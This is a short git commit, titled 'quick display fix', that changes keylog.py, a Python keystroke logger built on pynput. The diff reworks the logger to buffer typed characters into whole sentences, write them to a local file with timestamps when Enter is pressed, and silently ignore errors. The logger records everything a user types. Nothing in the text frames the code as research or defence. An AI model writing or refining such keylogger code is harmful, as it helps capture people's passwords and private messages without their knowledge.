9586aeefe6fa12829cd5559f1dde12189a2c8d75
Ines <inesallag91@gmail.com>
2025-10-07 20:22:51 +0200

    quick display fix

--- keylog.py
+++ keylog.py
@@ -1,14 +1,26 @@
 from pynput import keyboard
 from datetime import datetime
 
+# I'll optimize it
+timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+with open('keylog.txt', 'a') as f:
+    f.write(f"\n\n------Recording Started {timestamp}------\n")
+
+current_sentence = ""
+
 def on_press(key):
+    global current_sentence
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     try:
         with open('keylog.txt', 'a') as f:
             if hasattr(key, 'char') and key.char:
-                f.write(f'[{timestamp}] Key: {key.char}\n')
-            else:
-                f.write(f'[{timestamp}] Special: {key}\n')
+                current_sentence += key.char
+            elif key == keyboard.Key.space:
+                current_sentence += " "
+            elif key == keyboard.Key.enter:
+                f.write(f"[{timestamp}] {current_sentence}\n")
+                current_sentence = ""
+            f.flush()
     except Exception:
         pass
 
